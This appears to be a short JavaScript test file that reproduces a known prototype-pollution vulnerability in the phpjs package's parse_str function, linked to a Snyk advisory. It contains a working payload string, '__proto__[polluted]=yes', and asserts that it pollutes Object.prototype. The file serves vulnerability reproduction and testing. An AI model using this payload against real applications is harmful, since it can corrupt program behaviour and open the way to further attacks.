//https://snyk.io/vuln/SNYK-JS-PHPJS-598681

test("prototype pollution in phpjs", () => {
  expect({}.polluted).toBe(undefined);

  const p = require("phpjs");
  p.parse_str("__proto__[polluted]=yes", {});

  expect({}.polluted).toBe("yes");
});
